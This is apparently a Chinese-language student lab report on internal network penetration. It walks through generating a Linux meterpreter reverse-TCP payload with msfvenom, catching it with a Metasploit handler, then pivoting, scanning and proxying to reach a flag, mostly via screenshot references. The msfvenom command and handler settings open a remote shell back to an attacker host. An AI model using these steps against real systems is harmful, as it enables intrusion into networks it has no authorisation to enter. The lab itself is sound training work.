# 网安实践：内网渗透和攻击

## 实验环境

* kali

* metasploit

## 实验步骤

1. 在靶机上生成meterpreter.elf文件
` msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=4422 -f elf > meterpreter.elf`
![](./pics/手动生成meterpretershell.png)


2. 上传
![](./pics/上传.png)
![](./pics/上传成功.png)

3. 在metasploit里设置如下并`run -j`等待
```
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost <攻击者主机IP>
set lport <端口>
run -j
```
注意，这里的IP和端口要和生成.elf文件时设置的一样

5. 在靶机里运行meterpreter
![](./pics/进入容器下载文件并运行.png)

6. 连接成功
![](./pics/拿到meterpretershell.png)

7. 升级shell
![](./pics/升级会话窗口.png)

8. 查看route，arp， ipconfig
![](./pics/查看arp.png)
![](./pics/查看route.png)
![](./pics/ipconfig.png)

9. 设置pivot路由
![](./pics/添加pivot路由.png)

10. 扫描
![](./pics/扫描结果1.png)
![](./pics/开放的主机和服务.png)

11. 设置代理
参照教学课件和视频
![](./pics/socks代理.png)
![](./pics/查看1080端口服务开放情况.png)
`cat /etc/proxychains4.conf` 
确认有以下配置
![](./pics/修改proxychains配置.png)
并且配置浏览器代理
![](./pics/代理3.png)

12. 成功访问第一层
![](./pics/第三个flag.png)
